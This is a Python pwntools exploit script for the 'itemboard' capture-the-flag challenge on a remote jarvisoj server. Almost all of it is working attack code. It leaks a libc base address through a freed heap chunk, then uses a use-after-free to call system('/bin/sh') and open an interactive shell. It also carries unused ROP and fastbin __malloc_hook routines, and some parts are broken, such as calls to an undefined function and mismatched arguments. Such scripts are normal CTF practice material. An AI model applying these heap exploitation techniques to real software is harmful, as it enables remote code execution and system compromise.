#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *

DEBUG = False
if DEBUG:
	io = process("./itemboard")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	r = ROP(libc)
	elf = ELF("./itemboard")
	offset = 0x7ffff7dd1b78-0x00007ffff7a0d000
	print hex(offset)
else:
	io = remote("pwn2.jarvisoj.com","9887")
	libc = ELF("./libc-2.19.so")
	r = ROP(libc)
	elf = ELF("./itemboard")
	malloc_hook = 0x3BE740+0x10
	offset = 0x3BE000

def Add(name,description_len,description):
	io.sendlineafter("choose:\n","1")
	io.sendlineafter("Item name?\n",name)
	io.sendlineafter("Description's len?\n",str(description_len))
	io.sendafter("Description?\n",description)
	#io.recvuntil("Add Item Successfully!\n")

def list():
	io.sendlineafter("choose:\n","2")
	return io.recvuntil("1.Add a item\n")

def show(index):
	io.sendlineafter("choose:\n","3")
	io.sendlineafter("Which item?\n",str(index))
	return io.recvuntil("1.Add a item\n")
"""
def change(index,size,content):
	io.sendlineafter("Your choice:","3")
	io.sendlineafter("Please enter the index of servant:",str(index))
	io.sendlineafter("Please enter the length of servant name:",str(size))
	io.sendafter("Please enter the new name of the servnat:",content)
"""

def free(index):
	io.sendlineafter("choose:\n","4")
	io.sendlineafter("Which item?\n",str(index))

def leak():
	Add("ss",0x100,0xff*"a")
	Add("ss",0x100,0xff*"a")
	free(0)
	libc = show(0).split("Description:")[1][:6] + "\x00\x00"
	leak_addr = u64(show(0).split("Description:")[1][:6]+"\x00\x00")
	#print hex(info)
	print hex(leak_addr)
	if debug:
		leak_addr2 = leak_addr - offset
	else:
		leak_addr2 = leak_addr - leak_addr%0x1000 - offset
	log.success("libc_base:" + hex(leak_addr2))
	return leak_addr2, leak_addr

def rop(libcbase,top_chunk):
	libc.address = libcbase
	system = libc.symbols["system"]
	print hex(system)
	binsh = libc.search("/bin/sh").next()
	payload = 0x400 * "a" + p64(top_chunk-8)*3
	payload += p64((r.rdi[0] + libcbase)) + p64(binsh) + p64(system)
	#raw_input()
	Add("s",len(payload)+1,payload)	
	#io.sendline("cat flag")

def uaf(libcbase):
	libc.address = libcbase
	system = libc.symbols["system"]
	print hex(system)
	free(1)
	Add('/bin/sh;EEEEEEEE'+p64(system),24,'\x0a')
	free(0)

def fastbinattack(libc_base):
	malloc_hook = libc.symbols["__malloc_hook"] + libc_base
	print hex(libc.symbols["__malloc_hook"])
	system_addr = libc.symbols["system"] + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	log.info("system_addr @" + hex(system_addr))
	Add(0x40,0x40*"a")
	Add(0x60,0x60*"a")#7
	Add(0x60,0x60*"a")#8
	free(7)
	change(6, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))

	Add(0x60,0x60*"a")
    # free_hook
	Add(0x60,"a")
    #		   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)	  + p64(0)	+ p64(libc_base + 0x45216)#0x4526a)
	change(8, len(payload), payload)
	io.sendlineafter("Your choice:","2")
	io.sendafter("Please enter the length of servant name:",str(0x100))

context.log_level = "debug"
#gdb.attach(io,"b *0x555555554CAC")#,"b *0x555555554AC7")
libcbase,topchunk = leak()
uaf(libcbase)
#rop(libcbase,topchunk)
#fastbinattack(leak())
io.interactive()
	
